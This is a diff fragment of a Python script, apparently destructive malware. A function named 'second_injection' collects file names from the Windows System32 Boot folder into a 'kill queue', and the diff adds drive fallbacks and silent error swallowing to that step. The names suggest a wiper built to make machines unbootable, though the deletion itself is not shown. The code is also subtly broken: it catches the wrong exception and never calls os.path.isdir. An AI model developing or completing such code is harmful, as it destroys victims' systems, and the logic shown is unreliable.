@@ -58,12 +58,19 @@ def second_injection():
     boot_files = []
     #first add boot files into a list
     def add_bootfiles_in_kill_queue():
-        
+        try:
+            os.chdir("C:\Windows\System32\Boot")
+        except LookupError as e:
+            os.chdir("D:\Windows\System32\Boot")
         boot_path = r"C:\Windows\System32\Boot"
-        for _ in os.listdir(boot_path):
-            if os.path.isdir:
-                continue
-            boot_files.append(_)
+        try:
+            for _ in os.listdir(boot_path):
+                if os.path.isdir:
+                    continue
+                boot_files.append(_)
+                
+        except:
+            pass
             
     add_bootfiles_in_kill_queue()
     
